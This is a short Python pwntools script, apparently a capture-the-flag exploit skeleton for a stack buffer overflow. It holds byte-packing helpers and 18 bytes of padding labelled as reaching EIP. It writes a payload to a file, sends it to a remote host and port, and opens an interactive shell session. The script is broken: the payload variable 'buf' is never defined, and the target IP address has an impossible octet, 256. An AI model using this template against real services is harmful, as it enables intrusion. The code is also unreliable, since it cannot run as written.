#!/usr/bin/env python3


import math

from pwn import *

def roundup(x):
    return int(math.ceil(x / 2.0)) * 2 

def int_to_bytes_string(hex_value, max_len = 8):
    hex_str = format(hex_value, 'x')
    byte_str = bytes.fromhex(hex_str.rjust(roundup(len(hex_str)), '0'))
    return byte_str.rjust(max_len, b'\x00')[::-1]
    
def hex_to_bytes_string(hex_value):
    hex_str = f"{hex_value}"
    byte_str = bytes.fromhex(hex_str.rjust(roundup(len(hex_str)), '0'))
    return byte_str.rjust(8, b'\x00')[::-1]
    
# Addresses of interest
padding_to_EIP = b'A' * 18

# Exploit


with open("exploit", "wb") as f:
    f.write(buf + b"\n")


r = remote('165.232.46.256', 31846)
r.sendline(buf + b"\n")
r.interactive()
